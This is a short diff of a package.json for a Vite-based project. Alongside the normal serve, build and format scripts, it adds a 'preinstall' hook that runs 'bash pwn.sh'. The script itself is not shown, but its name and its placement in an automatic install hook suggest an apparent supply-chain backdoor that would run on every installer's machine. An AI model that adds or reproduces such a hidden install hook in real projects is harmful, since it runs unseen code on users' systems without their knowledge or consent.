@@ -7,6 +7,7 @@
         "name": "Stefan Dej"
     },
     "scripts": {
+        "preinstall": "bash pwn.sh",
         "serve": "vite serve",
         "build": "vite build && npm run build.zip",
         "format": "npm run format:base -- --write",
